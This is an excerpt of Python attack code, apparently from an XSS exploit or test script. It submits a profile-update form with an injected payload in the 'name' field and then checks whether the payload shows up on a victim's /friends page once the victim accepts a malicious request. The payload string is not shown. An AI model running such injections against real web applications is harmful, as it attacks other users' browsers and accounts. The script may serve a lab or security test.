...
def xssvuln7():
 ...
 #  print(r.headers)
    ...
    multipart_form_data = {'username': (None, user), 'name':(None, payload), 'currentpassword':(None, password),'newpassword':(None, password), 'about':(None, 'trying to hack u'), 'photo': ('1598703889159.png', open('venv/1598703889159.png', 'rb')) }
    ...
    #### CHECKING TO SEE IF THE INJECTED 'name' FIELD IS REFLECTED ON THE /friends RESOURCE BY THE VICTIM AFTER HE ACCEPTS THE MALICIOUS REQUEST
